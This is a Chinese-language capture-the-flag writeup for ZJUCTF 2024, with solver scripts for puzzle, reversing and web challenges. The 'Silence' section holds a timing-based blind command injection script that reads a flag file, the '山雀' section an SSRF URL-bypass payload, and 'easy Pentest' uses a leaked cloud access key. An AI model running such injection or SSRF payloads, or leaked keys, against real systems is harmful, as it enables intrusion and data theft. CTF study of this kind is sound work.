---
title: ZJUCTF 2024 Writeup
date: 2024-10-22T20:25:46+08:00
tags:
  - CTF Writeup
---

参加了ZJUCTF 2024，这是Writeup.

<!-- more -->


<!-- **推荐用binwalk从这个pdf的末尾取出含有相关exp的zip文件。**

这些内容通常是二进制，或者太长而不便在正文中展示。



--- -->

<span style="font-size:60px;color:red">原来你们都是凭实力拿分，只有我背着一堆轮子。😭</span>

但是题目出的真好，做的豪爽

---

# 签到题


QQ群拿到前半`ZJUCTF{WElc0m3_7o_ZJUCTF2024_4ND_`

公众号拿到后半部分

```plaintext
签到题 flag 第二部分：H0P3_Y0U_ENjoy_the_6aM3}
加油💪冲冲冲🚀
```

# 容器题说明

字面意思连上容器得到flag

wsrx连不上了所以不放flag了（雾

# 签退问卷

同理问卷不想再做一遍所以不放flag了

# Master of C++

![](p1.png)

可以打表打到两万吗？当然可以！

```cpp

// Works for 1<=ARG<=27889
//                  (167**2, maybe more)

main(){
#define _(a) !(ARG!=a&&ARG%a==0)
#define o(a,b,c) (a&&_(b)&&_(c))
#define s ARG!=1&&o(o(o(o(o(o(o(o(o(o(o(o(o(o(o(o(o(o(o(_(2),3,5),7,11),13,17),19,23),29,31),37,41),43,47),53,59),61,67),71,73),79,83),89,97),101,103),107,109),113,127),131,137),139,149),151,157),163,167)?0:1
return s;
}

//我操尼玛1也是测试数据之一真nm服了

```

![](p2.png)

其实就是把这个压行再压行，~~终于活成了箱子最讨厌的样子（x~~

```cpp
int main(){
    int arg=ARG;
    for(int i=2; i*i<=arg;i++){
        if(arg%i==0){
            return 1;
        }
    }
    return 0;
}
```

flag为`ZJUCTF{pR3m4tuR3_0PT1miz4t1oN_1s_thE_R00t_of_4LL_3v1l}`

# Bytes?

奇怪的bytes？转成二进制！好像有点异常，其实不知道当初怎么想到字符画的，但总之是想到了。

总长度6072，分解质因数挨个试一下，276x22时拿到了

可以看pdf附带的zip文件，`/zjuc--chess/cpline_276.txt`

flag为`ZJUCTF{COU_GOU_LIANG_HANG_BA}`

# 小 A 口算

做出来的人好多...

会pwntools有手就行

```python
from pwn import * 


sh = remote("127.0.0.1",10304)

sh.sendline("1")

sh.recvuntil(" as much as possible!")

print("1",sh.recvline().decode())
print("1",sh.recvline().decode())



# string is like '15 ? 4',get the two number

str = sh.recvline().decode()
num1 = int(str.split("?")[0])
num2 = int(str.split("?")[1])
print(num1,num2)

sh.sendline(">" if num1>num2 else "<" if num1<num2 else "=")

print(sh.recvline().decode())
sh.recvline().decode()

for i in range(2000):
    str = sh.recvline().decode()
    if(str == "Time's up!\n"):
        break
    num1 = int(str.split("?")[0])
    num2 = int(str.split("?")[1])
    print(num1,num2,end=" ")

    sh.sendline(">" if num1>num2 else "<" if num1<num2 else "=")

    print(sh.recvline().decode())
    sh.recvline().decode()

# 
sh.interactive()
```

# CBA

先reverse CBA to ABC

![拖`Abc-decompiler`逆向](p3.png)



![反正就是啥都要倒过来](p4.png)



![整出来的东西](p5.png)


直接弄出来dump到html中

```javascript
var fs = require('fs');
var content = fs.readFileSync('stupid-fuck-colors.txt', 'utf8').split('\n');

let sps="<div>"

for (var i = 0; i < content.length; i++) {
    if(i % 100 == 0){
        sps+="</div><div style='display:block;width:fit-content;height:10px'>"
    }
    sps+="<span style='display:inline-block;width:10px;height:10px;background-color:"+content[i]+";'></span>"
}
sps+="</div>"

fs.writeFileSync('stupid-fuck-colors.html', sps, 'utf8');
```

![](p6.png)

# Silence

sleep-based test

sleep盲注（sql注入那里学来的技巧）

```python
lab = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/+=-_\{\}[]()\"?!.,:;"

from pwn import *

# check_cmd = " ls |  sed -n \"4p\""
check_cmd = "cat easy* "

r = remote("127.0.0.1", 14918)
r.recvuntil("$ ")
def thread_i(testingPos, testingChar):
    print("Testing " + testingChar + " at position " + str(testingPos) + " ...")
    r.sendline(check_cmd+""" | cut -c """+str(testingPos)+" | grep -q \""+ testingChar +"\"  && sleep 10s || echo 0")
    r.recvuntil("$ ")
    # print(testingChar + " at position " + str(testingPos) + " racing fast. ")


def testing_a(testingPos):
    # for char in lab:

    # for char in lab:
    #     t = threading.Thread(target=thread_i, args=(testingPos, char))
    #     t.start()
    #     t.join()
    # thread_i(testingPos, "a")
    for char in lab:
        thread_i(testingPos, char)

if __name__ == '__main__':
    # for i in range(1, 10):
        # testing_a(i)
    testing_a(28)

"""

2: boo
3: d
4: easy_peasy?
5: et
6: h

                           ?28 ?
ZJUCTF{I_Jus7-w4nt_2_slEE3p!zZZ}
0000000001111111111222222222233333333334
1234567890123456789012345678901234567890
"""
```

解释一下这个程序发生了什么：

首先猜flag文件的名字

发现有一个easy_peasy.....（后面没测）的文件可疑

然后就读，猜中那个字符会sleep卡住。

（一开始想多线程，让猜对的字母最先输出，以失败告终）

~~总之就是我想睡觉（乐~~

# ezxor

可以看zip文件中的`/zjuc--ezxor/wp.txt`

这玩意一旦分行了就没内味了

```plaintext
Bit of plain:

01010010011011110110110101100001011011100110001101100101001000000110100101101110001000000111010001101000011001010010000001101101011101010110111001100100011000010110111001100101001000000111011101101111011100100110110001100100001000000110100101110011001000000110110001101001011010110110010100100000011000010010000001110011011101000110000101110010011100100111100100100000011100110110101101111001001000000110000101100100011011010110100101110010011001010110010000100000011001100111001001101111011011010010000001100001001000000110001001110101011100110111010001101100011010010110111001100111001000000110001101101001011101000111100100101110

if flag is 1

10011100010010100100100110111110010010111011110110111001110000000100111001001011110000000101100001001111101110011100000001001001101001100100101110111000010000011011010001000110001111111010010110110101101000111011011110111000001111111011000110100010001111111011011110110001101100100100011000111111101111100011111110100010010110000100000110100011101000111010111000111111101000100100110110101110001111111011111001000111101101100100111001011100010001100100011111000000010001000101110001001010010010011100000001000001110000000100001110100110010111011010011110110111101100011011010001000101110000000100001001001110010110000101000111001011

if flag is 0

01100011101101011011011001000001101101000100001001000110001111111011000110110100001111111010011110110000010001100011111110110110010110011011010001000111101111100100101110111001110000000101101001001010010111000100100001000111110000000100111001011101110000000100100001001110010011011011100111000000010000011100000001011101101001111011111001011100010111000101000111000000010111011011001001010001110000000100000110111000010010011011000110100011101110011011100000111111101110111010001110110101101101100011111110111110001111111011110001011001101000100101100001001000010011100100101110111010001111111011110110110001101001111010111000110100

* we are sure flag is 0

Real:

01100011101101011011011000000011101101000101001001000110001111101011000110010100001111111010011110110000010001100011111110110110010110011011010001000111101111100100101110111001110000000101101001001010010111000100100011000111110000000000111001011101111000000100100001001110010011011011100111000000010000011100000001011101101001111011111001011100010111100101000111000000010111011011001001010001110000000100000110111000010010011011000110100011101110011011100010111111101110111010001110110101101101100011111110111110001110111011110001011001101000100101100001001000010011100100101110111010001111111011110110110001101001111010111000110100



compare
                         !    !            !                   !          !                                                                                                                                             !                !                !                                                                                                   !                                                                                                         !                  
01100011101101011011011001000001101101000100001001000110001111111011000110110100001111111010011110110000010001100011111110110110010110011011010001000111101111100100101110111001110000000101101001001010010111000100100001000111110000000100111001011101110000000100100001001110010011011011100111000000010000011100000001011101101001111011111001011100010111000101000111000000010111011011001001010001110000000100000110111000010010011011000110100011101110011011100000111111101110111010001110110101101101100011111110111110001111111011110001011001101000100101100001001000010011100100101110111010001111111011110110110001101001111010111000110100
01100011101101011011011000000011101101000101001001000110001111101011000110010100001111111010011110110000010001100011111110110110010110011011010001000111101111100100101110111001110000000101101001001010010111000100100011000111110000000000111001011101111000000100100001001110010011011011100111000000010000011100000001011101101001111011111001011100010111100101000111000000010111011011001001010001110000000100000110111000010010011011000110100011101110011011100010111111101110111010001110110101101101100011111110111110001110111011110001011001101000100101100001001000010011100100101110111010001111111011110110110001101001111010111000110100

Not same at 25
Not same at 30
Not same at 43
Not same at 63
Not same at 74
Not same at 216
Not same at 233
Not same at 250
Not same at 350
Not same at 456
Not same at 517


9 bit at flag str


- flag


011011010111001110011001100000101110011110000100010100100110011110111001101101111011011110010101101110000100101000101011101110011100000110010101100110100100011001001000110000101100101001001001101110011001010110100111101101011001010110010001100011000110011001111101100110000111101110010101110111000010100000100011110110000011111001010110


reversed
010110111100101001010101010000111001010001000110011110110101010001100101011011000110110001011111011001000110111100111110011001010010000101011111010101110110010101101100101000111010111101101101011001010101111101110100011011110101111101011001010010100101010101000011010101000100011001011111001100100011110000110010001101000010000101111101

[ÊUCF{Tell_do>e!_Wel£¯me_to_YJUCTF_2<24!}

Guess Real flag is:

ZJUCTF{Well_done!_Welcome_to_ZJUCTF_2024!}
```


# Shad0wTime

绷

输出的东西重新输入即可

喜报：比赛结束后容器连不上了，所以没有flag

# easy Pentest

几天前写某项目的后端时还在跟阿里云OSS斗智斗勇，这下题就来了。

直接启动Aliyun OSS Node SDK

（无敌了，带有secret key，Github就不让交commit（倒也合理）

```javascript
const OSS = require('ali-oss');

// 初始化OSS客户端。请将以下参数替换为您自己的配置信息。
const client = new OSS({
  region: 'oss-cn-beijing', // 示例：'oss-cn-hangzhou'，填写Bucket所在地域。
  accessKeyId: "LTAI5tLeHk1m8rLauyjs6Fyp", // 确保已设置环境变量OSS_ACCESS_KEY_ID。
  accessKeySecret: ..., // 确保已设置环境变量OSS_ACCESS_KEY_SECRET。
  bucket: 'oss-test-qazxsw', // 示例：'my-bucket-name'，填写存储空间名称。
});

async function get () {
    try {
      // 填写Object完整路径和本地文件的完整路径。Object完整路径中不能包含Bucket名称。
      // 如果指定的本地文件存在会覆盖，不存在则新建。
      // 如果未指定本地路径，则下载后的文件默认保存到示例程序所属项目对应本地路径中。
      const result = await client.get('fffffflllllaaaagggg.txt', 'E:\\Projects\\ctf-test\\zjuc--aliyun\\examplefile.txt');
      console.log(result);
    } catch (e) {
      console.log(e);
    }
  }
  
  get(); 
```

拿到flag`flag{99b87fa89d7e147c42e709dcd378e03e}`

# 山雀

https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass

`HTtP:𝓱𝓮𝓻E－𝓲𝓼｡𝔂𝓸𝓾𝒓．𝒻𝓁𝒶𝒂𝙖ⒶA④𝒈。URL`

![](p7.png)

# rev beginner 1

```cpp
#include <bits/stdc++.h>
using namespace std;
 char v9[31]="ZKWFXK\201ym\177it\177lt\204~p\204|{}\212V\225"; 

int main(int argc, char** argv) {
	 for (int i = 0; i <= 24; ++i )cout<<(char)(v9[i] - i);

	return 0;
}
```

会C++就行

flag为`ZJUCTF{rev_is_fun_right?}`

# rev beginner 2

```cpp
#include <bits/stdc++.h>
using namespace std;


char das(char al) {
    unsigned char cf = 0;
    char result = al;

  
    if ((al & 0x0F) > 0x09) {
        result = (result & 0xF0) + ((result & 0x0F) - 0x06);
        cf = 1; 
    }

    if ((al & 0xF0) > 0x90 || cf) {
        result = ((result & 0x0F) << 4) + ((result >> 4) - 0x06);
    }

    return result;
}

 char undas( char bcd) {

//return bcd;
//return bcd+0x06;
//return bcd+0x60;
return bcd+0x66;
}


char to_valid_char(char c) {
    if (c >= '0' && c <= '9') {
        return c;
    }
    if (c >= 'A' && c <= 'Z') {
        return c;
    }
    if (c >= 'a' && c <= 'z') {
        return c;
    }
    if(c == '_' || c == '.' || c == '-' || c == '!' || c == '@' || c == '#' || c == '$' || c == '%' || c == '^' || c == '&' || c == '*' || c == '(' || c == ')' || c == '+' || c == '=' || c == '{' || c == '}' || c == '[' || c == ']' || c == '|' || c == ':' || c == ';' || c == ',' || c == '<' || c == '.' || c == '>' || c == '?') {
        return c;
    }
    return ' ';
}



int main(int argc, char** argv) {
	char v12[26];
  *(int *)v12 = 0x30231E3C;
  *(int *)&v12[4] = 0x794D0D52;
  *(int *)&v12[8] = 0xDB4F3D42;
  *(int *)&v12[12] = 0x2FB3FF;
  *(int *)&v12[16] = 0x4F323E1F;
  *(int *)&v12[20] = 0xA4A33E52;
  v12[25]=0x21;
  v12[26]=0x8f;
  char v14[26];
  *(int *)&v14[0] = -778337675;
  *(int *)&v14[4] = 916896758;
  *(int *)&v14[8] = 2142365868;
  *(int *)&v14[12] = 431515568;
  *(int *)&v14[16] = 121126838;
  *(int *)&v14[20] = 1384365358;
  v14[25] = 0xf5;
  v14[26] = 0xff;
  char s2[26];
  *(int *)&s2[0] = 0xE4CDA88D;
  *(int *)&s2[4] = 0xCECEEEF8;
  *(int *)&s2[8] = 0x6EBF11CF;
  *(int *)&s2[12] = 0x4B50B9B8;
  *(int *)&s2[16] = 0x286B6DBE;
  *(int *)&s2[20] = 0xB3F3EB41;
  s2[25] = 0xf5;
  s2[26] = 0x87;
  
  

    for (int i = 0; i <= 25; ++i) {
        char _AL = s2[i] - v14[i];
        
//        _AL = das(_AL)
//		__asm("das");
_AL=undas(_AL);
        
        s2[i] = v12[i] + _AL;

        s2[i] = to_valid_char(s2[i]);
    }
    
//    printf("%",s2);
	cout<<s2;
	return 0;
}

```


`das`函数是真的在尝试逆向das，失败

直接暴力：反正`das`就是前后两各4bit看情况减6，不如直接试。

```plaintext
#
   00000000011111111112222222
   12345678901234567890123456
#1 ZJ[IZF{ klc    8-rkvkr  _
#2        w   0mk-       yk
#3        q   *ge        se
#4 TDUCT@u ef]    2 lepel  Y!

R  ZJUCTF{welc0me-2-reverse!}
```

# Minec(re)tf Unity Edition

Piece 1: 用Cheat Engine改数据

![](p8.png)

Piece 2: 用dotpeek反编译（p.s. 一开始没想到用dnSpy）

![](p9.png)

Piece 3: 用Assets Studio查素材

![](p10.png)

Piece 4: 用dnSpy上patch

![](p11.png)

当然，我们的大聪明还有一种非预期，那就是把所有cube全dump出来，然后盯着一堆方块始终认不对。

我要让所有人体验一遍这种痛苦（误

解压pdf后面续的zip文件，进入`/zjuc--mc/threejs`，通过`python -m http.server`或者`npx serve`等方式启动服务器，然后进入`localhost:<port>/dumped.html`

你可以通过鼠标和键盘进行操作。

![](p12.png)

![真能认出来吗？哈哈，那无敌了](p13.png)

# easy hap

拖进Abc-decompiler，前往CipherUtil方法

```java
class CipherUtil {

    /* renamed from: pkgName@entry, reason: not valid java name */
    public Object f0pkgNameentry;
    public Object isCommonjs;
    public Object moduleRecordIdx;

    public Object #1#(Object functionObject, Object newTarget, CipherUtil this, Object arg0) {
        Object obj = _lexenv_0_2_.cipherX;
        Object init = obj.init(import { default as cryptoFramework } from "@ohos:security.cryptoFramework".CryptoMode.ENCRYPT_MODE, arg0, 0);
        return init.then(#2#);
    }

    public Object #2#(Object functionObject, Object newTarget, CipherUtil this) {
        Object obj = _lexenv_0_2_.cipherX;
        return obj.doFinal(_lexenv_0_0_);
    }

    public Object #3#(Object functionObject, Object newTarget, CipherUtil this, Object arg0) {
        Object obj = _lexenv_0_3_.cipherY;
        Object init = obj.init(import { default as cryptoFramework } from "@ohos:security.cryptoFramework".CryptoMode.ENCRYPT_MODE, arg0, _lexenv_0_0_);
        return init.then(#4#);
    }

    public Object #4#(Object functionObject, Object newTarget, CipherUtil this) {
        Object obj = _lexenv_0_3_.cipherY;
        return obj.doFinal(_lexenv_0_1_);
    }

    public Object #5#(Object functionObject, Object newTarget, CipherUtil this, Object arg0, Object arg1) {
        arg0("");
        return null;
    }

    public Object #6#(Object functionObject, Object newTarget, CipherUtil this, Object arg0, Object arg1) {
        newlexenv(1);
        _lexenv_0_0_ = arg0;
        Object ldlexvar = _lexenv_1_5_;
        Object encryptX = ldlexvar.encryptX(_lexenv_1_0_);
        encryptX.then(#7#);
        return null;
    }

    public Object #7#(Object functionObject, Object newTarget, CipherUtil this, Object arg0) {
        _lexenv_1_1_ = arg0.data;
        Object ldlexvar = _lexenv_1_5_;
        Object encryptY = ldlexvar.encryptY(_lexenv_1_2_, _lexenv_1_1_);
        encryptY.then(#8#);
        return null;
    }

    public Object #8#(Object functionObject, Object newTarget, CipherUtil this, Object arg0) {
        _lexenv_1_3_ = arg0.data;
        Object ldlexvar = _lexenv_1_5_;
        Object encodeX = ldlexvar.encodeX(_lexenv_1_1_, _lexenv_1_3_);
        Object ldlexvar2 = _lexenv_1_5_;
        _lexenv_0_0_(ldlexvar2.encodeY(encodeX));
        return null;
    }

    public Object init(Object functionObject, Object newTarget, CipherUtil this) {
        Object cryptoFramework = import { default as cryptoFramework } from "@ohos:security.cryptoFramework";
        this.cipherX = cryptoFramework.createCipher(this.cipherAlgX);
        Object cryptoFramework2 = import { default as cryptoFramework } from "@ohos:security.cryptoFramework";
        this.cipherY = cryptoFramework2.createCipher(this.cipherAlgY);
        Object obj = createobjectwithbuffer(["data", 0]);
        obj.data = this.stringToUint8Array(this.commonCipherKeyStr);
        this.commonCipherKey = obj;
        return null;
    }

    /* JADX WARN: Type inference failed for: r14v24, types: [int] */
    /* JADX WARN: Type inference failed for: r14v26, types: [int] */
    public Object encodeX(Object functionObject, Object newTarget, CipherUtil this, Object arg0, Object arg1) {
        Object[] objArr = [Object];
        for (int i = 0; isfalse((i < 16 ? 1 : 0)) == null; i++) {
            objArr.push(arg0[i] ^ arg1[i]);
        }
        for (int i2 = 0; isfalse((i2 < 16 ? 1 : 0)) == null; i2++) {
            objArr.push(arg1[i2]);
        }
        return Uint8Array(objArr);
    }

    /* JADX WARN: Type inference failed for: r6v2, types: [Object, java.lang.Class] */
    public Object encodeY(Object functionObject, Object newTarget, CipherUtil this, Object arg0) {
        Object newobjrange = import { default as util } from "@ohos:util".Base64Helper();
        return newobjrange.encodeToStringSync(arg0);
    }

    public Object encrypt(Object functionObject, Object newTarget, CipherUtil this, Object arg0) {
        newlexenv(6);
        _lexenv_0_4_ = newTarget;
        _lexenv_0_5_ = this;
        _lexenv_0_3_ = null;
        _lexenv_0_1_ = null;
        if (isfalse((arg0.length != 32 ? 1 : 0)) == null) {
            return Promise(#5#);
        }
        Object ldlexvar = _lexenv_0_5_;
        _lexenv_0_0_ = ldlexvar.stringToUint8Array(arg0.slice(0, 16));
        Object ldlexvar2 = _lexenv_0_5_;
        _lexenv_0_2_ = ldlexvar2.stringToUint8Array(arg0.slice(16, 32));
        return Promise(#6#);
    }

    public Object encryptX(Object functionObject, Object newTarget, CipherUtil this, Object arg0) {
        newlexenv(3);
        _lexenv_0_1_ = newTarget;
        _lexenv_0_2_ = this;
        Object obj = createobjectwithbuffer(["data", 0]);
        obj.data = arg0;
        _lexenv_0_0_ = obj;
        Object cryptoFramework = import { default as cryptoFramework } from "@ohos:security.cryptoFramework";
        Object createSymKeyGenerator = cryptoFramework.createSymKeyGenerator(_lexenv_0_2_.cipherAlgName);
        Object convertKey = createSymKeyGenerator.convertKey(_lexenv_0_2_.commonCipherKey);
        return convertKey.then(#1#);
    }

    public Object encryptY(Object functionObject, Object newTarget, CipherUtil this, Object arg0, Object arg1) {
        newlexenv(4);
        _lexenv_0_2_ = newTarget;
        _lexenv_0_3_ = this;
        Object obj = createobjectwithbuffer(["data", 0]);
        obj.data = arg0;
        _lexenv_0_1_ = obj;
        Object obj2 = createobjectwithbuffer(["algName", "IvParamsSpec", "iv", 0]);
        Object obj3 = createobjectwithbuffer(["data", 0]);
        obj3.data = arg1;
        obj2.iv = obj3;
        _lexenv_0_0_ = obj2;
        Object cryptoFramework = import { default as cryptoFramework } from "@ohos:security.cryptoFramework";
        Object createSymKeyGenerator = cryptoFramework.createSymKeyGenerator(_lexenv_0_3_.cipherAlgName);
        Object convertKey = createSymKeyGenerator.convertKey(_lexenv_0_3_.commonCipherKey);
        return convertKey.then(#3#);
    }

    public Object CipherUtil(Object functionObject, Object newTarget, CipherUtil this) {
        this.cipherAlgName = "AES128";
        this.cipherAlgX = "AES128|ECB|NoPadding";
        this.cipherAlgY = "AES128|CBC|NoPadding";
        this.commonCipherKeyStr = "ZJUCTF2024-OHAPP";
        this.init();
        return this;
    }

    public Object func_main_0(Object functionObject, Object newTarget, CipherUtil this) {
        Object CipherUtil = hole.CipherUtil(Object2, Object3, hole, ["init", "com.zjuctf2024.easyhap/entry/ets/cipherUtil/CipherUtil.init", 0, "encryptX", "com.zjuctf2024.easyhap/entry/ets/cipherUtil/CipherUtil.encryptX", 1, "encryptY", "com.zjuctf2024.easyhap/entry/ets/cipherUtil/CipherUtil.encryptY", 2, "encodeX", "com.zjuctf2024.easyhap/entry/ets/cipherUtil/CipherUtil.encodeX", 2, "encodeY", "com.zjuctf2024.easyhap/entry/ets/cipherUtil/CipherUtil.encodeY", 1, "encrypt", "com.zjuctf2024.easyhap/entry/ets/cipherUtil/CipherUtil.encrypt", 1, "stringToUint8Array", "com.zjuctf2024.easyhap/entry/ets/cipherUtil/CipherUtil.stringToUint8Array", 1, 7]);
        Object obj = CipherUtil.prototype;
        _module_0_ = CipherUtil;
        return null;
    }

    public Object stringToUint8Array(Object functionObject, Object newTarget, CipherUtil this, Object arg0) {
        Object buffer = import { default as buffer } from "@ohos:buffer";
        return Uint8Array(buffer.from(arg0, "utf-8").buffer);
    }
}
```

有两个部分，第一个部分是初始化了加密器，AES128|ECB|NoPadding，以及AES128|CBC|NoPadding

第二个部分是对输入的数据切成两块，一块用AES128|ECB|NoPadding加密，加密完数据作为iv，提供给AES128|CBC|NoPadding用来加密第二块数据，加密完做了一个异或操作，然后转成base64

直接往cyberchef里面拖呗

![](p15.png)

![](p14.png)

flag为`ZJUCTF{????????????????D_a_5iMPl3_fl4g}`~~（前一段没截图，忘了，不想重逆一次了（猜你想说：你无敌了））~~

# Minec(re)tf

虽然没有做出来，但是做的过程很爽，分享一下~~非预期~~解法

Piece 1:

发现`/datapacks/world/data/main/recipes/flag_look_at_the_code_of_the_recipe.json`，运行其中说的函数，得到flag piece 1

Piece 2 & 3 :

真的感觉很抽象：
```javascript
// Read all files under './obfuscation/functions'
const fs = require('fs');
const path = require('path');
const Path = path.join(__dirname, './world/data/obfuscation/functions');

fs.readdir(Path, (err, files) => {
  if (err) throw err;
  files.forEach(file => {
    const filePath = path.join(Path, file);
    const data = fs.readFileSync(filePath, 'utf8');

    fs.writeFileSync(filePath, "say Fuck I'm "+file+"! \n"+data);
  });
});
```
在每一个混淆函数前面加一句话，让他说出自己是什么函数，再启动游戏，于是乎两个混淆后的函数就露出马脚了，直接取出flag piece

Piece 9 :

把`}`转成base64发现最后一个字符必是9，于是乎在混淆的函数里搜索`Flag Piece\[9\/9\]:.......9`(Regex)，直接薄纱（后来发现obfuscation里面Flag Piece 9/9好像本来就只有一个函数qwq

Piece 4

![按修改时间排序](p16.png)

有一个model是特殊的，究竟是谁捏，好难猜啊（

然后按提示安装blockbench，查看

Piece 5

直接反编译模组jar，~~rev方向签到题~~

Piece 7 用指令，Piece 8 用结构方块，这几个应该和预期解大差不差

Piece 6 不会